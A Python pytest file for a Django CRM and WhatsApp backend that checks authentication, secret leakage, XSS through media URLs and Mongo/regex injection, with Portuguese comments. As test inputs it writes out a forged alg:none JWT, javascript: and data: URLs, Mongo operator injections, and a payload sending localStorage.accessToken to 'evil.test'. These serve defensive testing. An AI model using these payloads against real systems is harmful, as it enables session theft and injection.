"""Segurança: autenticação em todas as rotas, vazamento de dados (Socket.IO, segredos), XSS por URL
de mídia, injeção em buscas e filtros, integridade do histórico e campos internos do lead."""
import asyncio
import re
from datetime import timedelta
from io import StringIO
from unittest.mock import AsyncMock

import pytest
from django.core.management import call_command
from django.urls import URLPattern, URLResolver, get_resolver
from rest_framework.test import APIClient

from agenda.models import CalendarEvent
from chat.models.conversation_model import ConversationModel
from chat.models.message_model import MessageModel
from crm import domain
from crm.models.custumer_model import Customer
from crm.models.lm_settings_model import LmSettings
from users.models.user_model import User
from utils.safe_url import safe_media_url

FAKE_ID = "507f1f77bcf86cd799439011"
WEBHOOK = "/api/v1/gateway/webhook/zapi/?token=test-webhook-token"

# Rotas abertas de propósito, cada uma com a própria proteção.
PUBLIC_ROUTES = {
    "/api/v1/users/token/": "login (throttle de 10/min por IP)",
    "/api/v1/users/token/refresh/": "troca do refresh token",
    "/api/v1/gateway/webhook/zapi/": "token do webhook",
    f"/api/v1/sales/proposals/{FAKE_ID}/pdf/": "link assinado (?t=)",
    f"/api/v1/sales/proposals/{FAKE_ID}/pdf/{FAKE_ID}": "link assinado (?t=)",
    "/api/v1/agenda/google/callback/": "state assinado do OAuth",
    f"/api/v1/chat/files/{FAKE_ID}/": "link assinado (?t=) do arquivo enviado na conversa",
    f"/api/v1/chat/files/{FAKE_ID}/{FAKE_ID}": "link assinado (?t=) do arquivo enviado na conversa",
}


def _concrete(prefix: str, pattern) -> str | None:
    text = str(pattern.pattern)
    if "format" in text:
        return None  # sufixo .json do router: mesma view
    text = text.lstrip("^").rstrip("$")
    text = re.sub(r"\(\?P<\w+>[^)]*\)", FAKE_ID, text)
    text = re.sub(r"<(?:\w+:)?\w+>", FAKE_ID, text)
    return prefix + text.replace("\\", "")


def all_api_urls(patterns=None, prefix="/") -> list[str]:
    urls = []
    for entry in patterns if patterns is not None else get_resolver().url_patterns:
        if isinstance(entry, URLResolver):
            sub = _concrete(prefix, entry)
            if sub is not None:
                urls += all_api_urls(entry.url_patterns, sub)
        elif isinstance(entry, URLPattern):
            url = _concrete(prefix, entry)
            if url is not None:
                urls.append(url)
    return sorted(set(u for u in urls if u.startswith("/api/")))


# --- Autenticação ------------------------------------------------------------------------------

@pytest.mark.django_db
def test_every_api_route_requires_login_except_the_protected_public_ones():
    urls = all_api_urls()
    assert len(urls) > 60  # garante que a varredura achou as rotas
    client = APIClient()
    open_routes = []
    for url in urls:
        if url in PUBLIC_ROUTES:
            continue
        for method in ("get", "post", "patch", "delete"):
            status = getattr(client, method)(url, {}, format="json").status_code
            if status not in (401, 403):
                open_routes.append(f"{method.upper()} {url} -> {status}")
    assert open_routes == []


@pytest.mark.django_db
def test_public_routes_refuse_without_their_own_credential():
    client = APIClient()
    assert client.post("/api/v1/gateway/webhook/zapi/", {"phone": "5562999990000"}, format="json").status_code == 401
    assert client.get(f"/api/v1/sales/proposals/{FAKE_ID}/pdf/").status_code == 401
    assert client.get(f"/api/v1/sales/proposals/{FAKE_ID}/pdf/?t=forjado").status_code == 401
    assert client.get(f"/api/v1/chat/files/{FAKE_ID}/").status_code == 404
    assert client.get(f"/api/v1/chat/files/{FAKE_ID}/a.pdf?t=forjado").status_code == 404
    assert client.get("/api/v1/agenda/google/callback/?state=forjado&code=x").status_code == 400
    assert client.post("/api/v1/users/token/", {"username": "erica", "password": "errada"}, format="json").status_code == 401


@pytest.mark.django_db
def test_webhook_token_with_non_ascii_characters_is_refused_not_a_crash():
    resp = APIClient().post("/api/v1/gateway/webhook/zapi/?token=tóken-ç", {"phone": "1"}, format="json")
    assert resp.status_code == 401


@pytest.mark.django_db
def test_expired_or_forged_jwt_is_refused(admin_user):
    from rest_framework_simplejwt.tokens import AccessToken
    expired = AccessToken.for_user(admin_user)
    expired.set_exp(lifetime=-timedelta(minutes=1))
    client = APIClient()
    client.credentials(HTTP_AUTHORIZATION=f"Bearer {expired}")
    assert client.get("/api/v1/crm/customers/").status_code == 401
    client.credentials(HTTP_AUTHORIZATION="Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxfQ.")
    assert client.get("/api/v1/crm/customers/").status_code == 401
    valid = AccessToken.for_user(admin_user)
    client.credentials(HTTP_AUTHORIZATION=f"Bearer {valid}")
    assert client.get("/api/v1/crm/customers/").status_code == 200


def _login(username: str) -> dict:
    from django.core.cache import cache
    cache.clear()  # o login tem throttle próprio (10/min)
    response = APIClient().post("/api/v1/users/token/", {"username": username, "password": "x"}, format="json")
    assert response.status_code == 200
    return response.data


def _refresh(token: str):
    return APIClient().post("/api/v1/users/token/refresh/", {"refresh": token}, format="json")


def test_logout_revokes_the_refresh_token(admin_user):
    tokens = _login("erica")
    client = APIClient()
    client.credentials(HTTP_AUTHORIZATION=f"Bearer {tokens['access']}")
    assert client.post("/api/v1/users/logout/", {"refresh": tokens["refresh"]}, format="json").status_code == 200
    assert _refresh(tokens["refresh"]).status_code == 401


def test_refresh_rotates_and_the_old_refresh_stops_working(admin_user):
    tokens = _login("erica")
    renewed = _refresh(tokens["refresh"])
    assert renewed.status_code == 200 and renewed.data["access"] and renewed.data["refresh"] != tokens["refresh"]
    assert _refresh(tokens["refresh"]).status_code == 401  # o refresh antigo foi para a lista negra
    assert _refresh(renewed.data["refresh"]).status_code == 200


def test_logout_only_revokes_the_users_own_refresh(admin_user, sdr_user):
    sdr_tokens = _login("sdr_base")
    erica_tokens = _login("erica")
    client = APIClient()
    client.credentials(HTTP_AUTHORIZATION=f"Bearer {erica_tokens['access']}")
    assert client.post("/api/v1/users/logout/", {"refresh": sdr_tokens["refresh"]}, format="json").status_code == 200
    assert _refresh(sdr_tokens["refresh"]).status_code == 200
    # Logout sem refresh (front antigo) continua respondendo 200.
    assert client.post("/api/v1/users/logout/", {}, format="json").status_code == 200


def test_django_admin_is_off_by_default():
    from django.conf import settings
    assert settings.DJANGO_ADMIN_ENABLED is False
    assert not any(str(p.pattern).startswith("admin/") for p in get_resolver().url_patterns)


def test_user_throttle_is_per_minute_so_polling_never_locks_the_sdr_out():
    from django.conf import settings
    rates = settings.REST_FRAMEWORK["DEFAULT_THROTTLE_RATES"]  # os testes só desligam as classes
    assert rates["user"].endswith("/minute") and int(rates["user"].split("/")[0]) >= 120
    assert rates["anon"] == "10/minute"


# --- Socket.IO (mensagens do WhatsApp em tempo real) ------------------------------------------

def test_socket_server_does_not_accept_any_origin():
    from nucleus import sio
    assert sio.allowed_origins() == ["http://localhost:5173"]
    assert sio.sio.eio.cors_allowed_origins == ["http://localhost:5173"]


@pytest.mark.django_db
def test_socket_token_validation(admin_user):
    from rest_framework_simplejwt.tokens import AccessToken, RefreshToken
    from nucleus.sio import user_id_from_token
    assert str(user_id_from_token(str(AccessToken.for_user(admin_user)))) == str(admin_user.id)
    assert user_id_from_token("") is None
    assert user_id_from_token("lixo") is None
    assert user_id_from_token(str(RefreshToken.for_user(admin_user))) is None  # refresh não serve
    expired = AccessToken.for_user(admin_user)
    expired.set_exp(lifetime=-timedelta(minutes=1))
    assert user_id_from_token(str(expired)) is None
    admin_user.is_active = False
    admin_user.save()
    assert user_id_from_token(str(AccessToken.for_user(admin_user))) is None


def test_socket_connect_refuses_without_valid_token(monkeypatch):
    import socketio
    from nucleus import sio as module

    monkeypatch.setattr(module, "user_id_from_token", lambda token: 7 if token == "bom" else None)
    monkeypatch.setattr(module.sio, "save_session", AsyncMock())
    with pytest.raises(socketio.exceptions.ConnectionRefusedError):
        asyncio.run(module.connect("sid1", {"QUERY_STRING": ""}, None))
    with pytest.raises(socketio.exceptions.ConnectionRefusedError):
        asyncio.run(module.connect("sid1", {"QUERY_STRING": ""}, {"token": "ruim"}))
    asyncio.run(module.connect("sid2", {"QUERY_STRING": ""}, {"token": "bom"}))
    module.sio.save_session.assert_awaited_once_with("sid2", {"user_id": 7})


# --- Vazamento de segredos -------------------------------------------------------------------

@pytest.mark.django_db
def test_settings_endpoint_never_returns_google_tokens(sdr_api):
    cfg = LmSettings.get()
    cfg.google_refresh_token = "1//refresh-secreto"
    cfg.google_sync_token = "sync-secreto"
    cfg.save()
    body = str(sdr_api.get("/api/v1/crm/settings/").data)
    assert "refresh-secreto" not in body and "sync-secreto" not in body
    assert sdr_api.patch("/api/v1/crm/settings/", {"approval_ceiling": 1}, format="json").status_code == 403


@pytest.mark.django_db
def test_system_config_is_admin_only(sdr_api, api_client):
    assert sdr_api.get("/api/v1/chat/configuracoes/").status_code == 403
    assert sdr_api.post("/api/v1/chat/configuracoes/", {"zapi_token": "x"}, format="json").status_code == 403
    assert api_client.get("/api/v1/chat/configuracoes/").status_code == 200


@pytest.mark.django_db
def test_team_list_and_access_changes_are_admin_only(sdr_api, sdr_user, admin_user):
    assert sdr_api.get("/api/v1/users/usuarios/").status_code == 403
    assert sdr_api.patch(f"/api/v1/users/usuarios/{admin_user.id}/", {"is_staff": False}, format="json").status_code == 403
    assert sdr_api.post("/api/v1/users/usuarios/", {"username": "novo", "password": "SenhaForte#2026"}, format="json").status_code == 403
    me = sdr_api.get("/api/v1/users/me/").data
    assert "password" not in me and me["username"] == "sdr_base"
    # Perfil não promove a admin
    sdr_api.patch("/api/v1/users/update_profile/", {"is_staff": True, "role": "admin", "first_name": "S"}, format="json")
    sdr_user.refresh_from_db()
    assert sdr_user.is_staff is False and sdr_user.role == "sdr"


@pytest.mark.django_db
def test_admin_assigns_roles_and_weak_passwords_are_refused(api_client, sdr_user):
    created = api_client.post("/api/v1/users/usuarios/", {"username": "lucia", "password": "Locacao#Porta2026",
                                                          "first_name": "Lúcia", "role": "porta"}, format="json")
    assert created.status_code == 201, created.data
    assert User.objects.get(username="lucia").role == "porta"
    assert api_client.post("/api/v1/users/usuarios/", {"username": "fraco", "password": "123456"},
                           format="json").status_code == 400

    resp = api_client.patch(f"/api/v1/users/usuarios/{sdr_user.id}/", {"role": "b2bflow"}, format="json")
    assert resp.status_code == 200 and resp.data["lm_role"] == "b2bflow"
    assert api_client.patch(f"/api/v1/users/usuarios/{sdr_user.id}/", {"role": "dono"}, format="json").status_code == 400

    client = APIClient()
    client.force_authenticate(sdr_user)
    sdr_user.set_password("x")
    sdr_user.save()
    weak = client.post("/api/v1/users/change_password/", {"old_password": "x", "new_password": "12345678"}, format="json")
    assert weak.status_code == 400
    ok = client.post("/api/v1/users/change_password/", {"old_password": "x", "new_password": "Outra#Senha2026"}, format="json")
    assert ok.status_code == 200


# --- XSS por URL de mídia ---------------------------------------------------------------------

@pytest.mark.parametrize("url,expected", [
    ("https://storage.z-api.io/a.jpg", "https://storage.z-api.io/a.jpg"),
    ("http://x.test/arquivo.pdf", "http://x.test/arquivo.pdf"),
    ("/api/v1/sales/proposals/1/pdf/a.pdf?t=x", "/api/v1/sales/proposals/1/pdf/a.pdf?t=x"),
    ("javascript:alert(1)//.pdf", None),
    ("JaVaScRiPt:alert(1)", None),
    (" javascript:alert(1)", None),
    ("data:text/html;base64,PHNjcmlwdD4=", None),
    ("vbscript:msgbox(1)", None),
    ("//evil.test/x.png", None),
    ("https:///semhost", None),
    ("https://x.test/a\nb", None),
    ({"$ne": None}, None),
    (None, None),
])
def test_safe_media_url(url, expected):
    assert safe_media_url(url) == expected


@pytest.mark.django_db
def test_customer_cannot_inject_a_script_url_through_whatsapp(zapi_outbox):
    from unittest.mock import patch
    with patch("events.tasks.trigger_ai_agent_task.apply_async"):
        client = APIClient()
        base = {"phone": "5562999990000", "isGroup": False, "status": "RECEIVED", "senderName": "Atacante"}
        client.post(WEBHOOK, {**base, "text": {"message": "Olá"}}, format="json")
        client.post(WEBHOOK, {**base, "messageId": "m2", "image": {"imageUrl": "javascript:alert(document.cookie)",
                                                                     "caption": "foto"}}, format="json")
        client.post(WEBHOOK, {**base, "messageId": "m3", "text": {
            "message": "<file-url>javascript:fetch('//evil.test?'+localStorage.accessToken)//.pdf</file-url> oi"}},
            format="json")
    incoming = list(MessageModel.objects(direction="INCOMING"))
    assert incoming and all(m.media_url is None or m.media_url.startswith("http") for m in incoming)
    image = next(m for m in incoming if m.message_type == "image")
    assert image.media_url is None


@pytest.mark.django_db
def test_attachment_url_must_be_http(api_client):
    lead = Customer(name="Ana", phone="5562911112222", product="corporativo").save()
    url = f"/api/v1/crm/customers/{lead.id}/qualification/attachment/"
    assert api_client.post(url, {"url": "javascript:alert(1)//x.pdf", "kind": "rider"}, format="json").status_code == 400
    assert api_client.post(url, {"url": "data:text/html,<script>", "kind": "rider"}, format="json").status_code == 400
    ok = api_client.post(url, {"url": "https://storage.z-api.io/rider.pdf", "kind": "rider"}, format="json")
    assert ok.status_code == 200 and ok.data["attachments"][0]["name"] == "rider.pdf"


# --- Campos internos do lead pelo formulário --------------------------------------------------

@pytest.mark.django_db
def test_lead_form_cannot_write_internal_fields(sdr_api):
    lead = Customer(name="Ana", phone="5562911112222", product="corporativo").save()
    resp = sdr_api.patch(f"/api/v1/crm/customers/{lead.id}/", {
        "notes": "ok", "proposal_sent_at": "2026-10-01T10:00:00", "flags": ["aguardando_cliente"],
        "human_operator": True, "attachments": [{"url": "javascript:alert(1)", "kind": "outro"}],
        "qualification": {"x": 1}, "pending_fields": [], "needs_erica": True, "agent": "outro_agente",
        "qualified_at": "2026-10-01", "first_contact_at": "2026-10-01",
    }, format="json")
    assert resp.status_code == 200, resp.data
    lead.reload()
    assert lead.notes == "ok"
    assert lead.proposal_sent_at is None and lead.flags == [] and lead.human_operator is False
    assert lead.attachments == [] and lead.qualification == {} and lead.needs_erica is False
    assert lead.agent is None and lead.qualified_at is None and lead.first_contact_at is None
    # A etapa anda livre, mas a data de envio continua sendo só da proposta enviada
    jump = sdr_api.patch(f"/api/v1/crm/customers/{lead.id}/", {"customer_state_now": "PROPOSAL_SENT"}, format="json")
    assert jump.status_code == 200
    lead.reload()
    assert lead.customer_state_now == "PROPOSAL_SENT" and lead.proposal_sent_at is None


@pytest.mark.django_db
def test_edit_lead_dialog_payload_saves(api_client):
    """Regressão: o formulário da tabela /leads manda lost_reason "" e dava erro 500."""
    lead = Customer(name="Ana", phone="5562911112222").save()
    payload = {"name": "Ana Paula", "phone": "5562911112222", "customer_state_now": "NEW_LEAD", "lost_reason": "",
               "celebration_type": "", "event_title": "", "event_date": "", "guest_count": 0, "quoted_amount": 0,
               "contract_value": 0, "venue": "", "notes": "ligar amanhã", "next_step": "",
               "last_interaction_at": "2026-10-19T12:00:00.000Z"}
    resp = api_client.patch(f"/api/v1/crm/customers/{lead.id}/", payload, format="json")
    assert resp.status_code == 200, resp.data
    assert resp.data["name"] == "Ana Paula" and resp.data["notes"] == "ligar amanhã"
    lost = api_client.patch(f"/api/v1/crm/customers/{lead.id}/", {**payload, "customer_state_now": "LOST",
                                                                   "lost_reason": "preco"}, format="json")
    assert lost.status_code == 200 and lost.data["customer_state_now"] == "LOST" and lost.data["lost_reason"] == "preco"
    assert api_client.patch(f"/api/v1/crm/customers/{lead.id}/", {"owner": "chefe"}, format="json").status_code == 400


@pytest.mark.django_db
def test_lead_register_starts_as_new_lead_without_duplicating_the_phone(sdr_api):
    resp = sdr_api.post("/api/v1/crm/customers/", {"name": "Bia", "phone": "(62) 99111-2222",
                                                   "customer_state_now": "CONTRACT_SIGNED"}, format="json")
    assert resp.status_code == 201, resp.data
    assert resp.data["customer_state_now"] == domain.NEW_LEAD and resp.data["phone"] == "5562991112222"
    # Mesmo número, com e sem o nono dígito: conflito com o id do contato existente
    for phone in ("62991112222", "556291112222"):
        dup = sdr_api.post("/api/v1/crm/customers/", {"name": "Bia 2", "phone": phone}, format="json")
        assert dup.status_code == 409 and dup.data["existing_id"] == resp.data["id"]
    other = Customer(name="Caio", phone="5562933334444").save()
    clash = sdr_api.patch(f"/api/v1/crm/customers/{other.id}/", {"phone": "62 99111-2222"}, format="json")
    assert clash.status_code == 409
    assert sdr_api.post("/api/v1/crm/customers/", {"phone": "abc"}, format="json").status_code == 400


@pytest.mark.django_db
def test_only_admin_deletes_leads(sdr_api, api_client):
    lead = Customer(name="Ana", phone="5562911112222").save()
    assert sdr_api.delete(f"/api/v1/crm/customers/{lead.id}/").status_code == 403
    assert Customer.objects(id=lead.id).count() == 1
    assert api_client.delete(f"/api/v1/crm/customers/{lead.id}/").status_code == 204


@pytest.mark.django_db
def test_sdr_cannot_unmark_a_partner(sdr_api, api_client):
    partner = Customer(name="Parceiro", phone="5562911112222", human_operator=True, owner="erica",
                       contact_type="parceiro").save()
    url = f"/api/v1/crm/contacts/{partner.id}/"
    assert sdr_api.patch(url, {"human_operator": False}, format="json").status_code == 403
    partner.reload()
    assert partner.human_operator is True
    assert api_client.patch(url, {"human_operator": False}, format="json").status_code == 200


# --- Histórico do atendimento -----------------------------------------------------------------

@pytest.mark.django_db
def test_conversation_and_message_history_cannot_be_edited_or_deleted(api_client):
    customer = Customer(name="Ana", phone="5562911112222").save()
    conversation = ConversationModel(customer=customer).save()
    message = MessageModel(conversation=conversation, customer=customer, role="user", direction="INCOMING",
                           content="original").save()
    conv_url = f"/api/v1/chat/conversations/{conversation.id}/"
    msg_url = f"/api/v1/chat/messages/{message.id}/"
    assert api_client.put(conv_url, {"tag": "AGENTE", "customer": FAKE_ID}, format="json").status_code == 405
    assert api_client.delete(conv_url).status_code == 405
    assert api_client.post("/api/v1/chat/conversations/", {"customer": str(customer.id)}, format="json").status_code == 405
    for method in ("put", "patch", "delete"):
        assert getattr(api_client, method)(msg_url, {"content": "alterado"}, format="json").status_code == 405
    assert api_client.delete(f"/api/v1/chat/mensagens/{message.id}/").status_code == 405
    message.reload()
    assert message.content == "original" and ConversationModel.objects(id=conversation.id).count() == 1
    # O que o painel usa continua funcionando
    assert api_client.get(conv_url).status_code == 200
    assert api_client.patch(conv_url, {"mark_read": True}, format="json").status_code == 200


# --- Injeção em buscas e filtros ---------------------------------------------------------------

@pytest.mark.django_db
@pytest.mark.parametrize("term", [".*", "(", "[a-z", "\\", "^.+$", "$where", "{\"$ne\": null}"])
def test_search_terms_are_literal_not_regex(api_client, term):
    Customer(name="Ana", phone="5562911112222", product="corporativo").save()
    ConversationModel(customer=Customer.objects.first()).save()
    for url in ("/api/v1/crm/customers/", "/api/v1/crm/funnel/", "/api/v1/crm/contacts/", "/api/v1/chat/conversations/"):
        resp = api_client.get(url, {"search": term})
        assert resp.status_code == 200, (url, term, resp.data)
        body = resp.data
        found = body.get("results") if "results" in body else [c for col in body.values() for c in col["results"]]
        assert found == [], (url, term)


@pytest.mark.django_db
def test_mongo_operators_in_json_are_not_executed(porta_api):
    call_command("seed_inventory", stdout=StringIO())
    resp = porta_api.post("/api/v1/inventory/movements/", {"code": {"$gt": ""}, "qty": 1, "type": "saida"}, format="json")
    assert resp.status_code == 400
    resp = porta_api.post("/api/v1/inventory/movements/", {"code": "q30_torre_5m", "qty": 1, "type": "saida",
                                                          "proposal_id": {"$ne": None}}, format="json")
    assert resp.status_code == 400
    assert porta_api.post("/api/v1/inventory/items/", {"code": {"$ne": None}, "name": "x", "line": "Q30"},
                          format="json").status_code == 400
    assert porta_api.post("/api/v1/sales/proposals/calculate/", {"mode": "porta", "customer_id": {"$ne": None},
                                                                "inputs": {}}, format="json").status_code == 400


@pytest.mark.django_db
def test_invalid_ids_return_4xx_not_500(api_client):
    for method, url in (
        ("get", "/api/v1/crm/customers/nao-e-id/"), ("post", "/api/v1/crm/customers/nao-e-id/stage/"),
        ("get", "/api/v1/sales/proposals/nao-e-id/"), ("post", "/api/v1/sales/proposals/nao-e-id/send/"),
        ("patch", "/api/v1/inventory/items/nao-e-id/"), ("delete", "/api/v1/agenda/events/nao-e-id/"),
        ("get", "/api/v1/crm/contacts/nao-e-id/"), ("post", "/api/v1/crm/tasks/nao-e-id/done/"),
        ("get", "/api/v1/crm/customers/?page=abc"),
    ):
        status = getattr(api_client, method)(url, {}, format="json").status_code
        assert 400 <= status < 500, (method, url, status)


@pytest.mark.django_db
def test_inventory_quantity_cannot_be_negative(porta_api):
    call_command("seed_inventory", stdout=StringIO())
    from inventory.models import InventoryItem
    item = InventoryItem.objects.get(code="q30_torre_5m")
    assert porta_api.patch(f"/api/v1/inventory/items/{item.id}/", {"qty_total": -5}, format="json").status_code == 400
    assert porta_api.patch(f"/api/v1/inventory/items/{item.id}/", {"qty_total": "muito"}, format="json").status_code == 400
    assert porta_api.patch(f"/api/v1/inventory/items/{item.id}/", {"qty_total": 100}, format="json").status_code == 200


# --- PDF da proposta --------------------------------------------------------------------------

@pytest.mark.django_db
def test_pdf_link_is_signed_per_proposal_and_frameable_only_by_the_panel(api_client):
    from sales.models import Proposal
    from sales.services.proposal_service import signed_pdf_url
    lead = Customer(name="Ana", phone="5562911112222").save()
    lines = [{"code": "q30_torre_5m", "name": "Torre Q30 5 m", "block": "estrutura", "qty": 2, "unit": "peça",
              "unit_price": 75, "subtotal": 150, "owned": True}]
    from datetime import datetime
    proposal = Proposal(customer=lead, version=1, mode="porta", inputs={"pickup_date": "2026-10-23", "return_date": "2026-10-26"},
                        lines=lines, total=150, status="rascunho", period_start=datetime(2026, 10, 23),
                        period_end=datetime(2026, 10, 27)).save()
    other = Proposal(customer=lead, version=2, mode="porta", inputs=proposal.inputs, lines=lines, total=150,
                     status="rascunho", period_start=proposal.period_start, period_end=proposal.period_end).save()

    url = signed_pdf_url(str(proposal.id), "proposta.pdf").split("/api/v1", 1)[1]
    anon = APIClient()
    resp = anon.get("/api/v1" + url)
    assert resp.status_code == 200 and resp["Content-Type"] == "application/pdf"
    assert "X-Frame-Options" not in resp
    assert resp["Content-Security-Policy"] == "frame-ancestors 'self' http://localhost:5173"
    token = url.split("?t=", 1)[1]
    assert anon.get(f"/api/v1/sales/proposals/{other.id}/pdf/?t={token}").status_code == 401
    # Demais respostas da API continuam proibindo iframe (clickjacking)
    assert api_client.get("/api/v1/crm/meta/")["X-Frame-Options"] == "DENY"


# --- Agenda ------------------------------------------------------------------------------------

@pytest.mark.django_db
def test_only_erica_cancels_events_that_came_from_her_google_calendar(sdr_api, api_client, monkeypatch):
    from datetime import datetime
    monkeypatch.setattr("agenda.services.agenda_service.is_configured", lambda: False)
    personal = CalendarEvent(google_event_id="g-pessoal", type="externo", source="google", title="Dentista",
                             start=datetime(2026, 10, 22, 13), end=datetime(2026, 10, 22, 14)).save()
    assert sdr_api.delete(f"/api/v1/agenda/events/{personal.id}/").status_code == 403
    personal.reload()
    assert personal.status == "confirmado"
    assert api_client.delete(f"/api/v1/agenda/events/{personal.id}/").status_code == 200
